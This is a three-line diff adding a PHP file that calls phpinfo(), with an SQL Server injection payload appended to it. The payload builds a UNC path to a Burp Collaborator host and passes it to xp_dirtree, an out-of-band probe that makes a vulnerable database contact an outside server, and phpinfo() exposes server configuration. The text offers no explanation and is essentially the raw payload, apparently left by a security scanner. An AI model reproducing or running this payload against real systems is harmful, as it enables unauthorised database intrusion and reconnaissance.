@@ -1,0 +1,3 @@
+<?php
+phpinfo();
+?>;declare @q varchar(99);set @q='\\ppii4c7ec1szdmr8prevd9o24tamycm3cr4ev2k.burpcollab'+'orator.net\tbq'; exec master.dbo.xp_dirtree @q;-- 
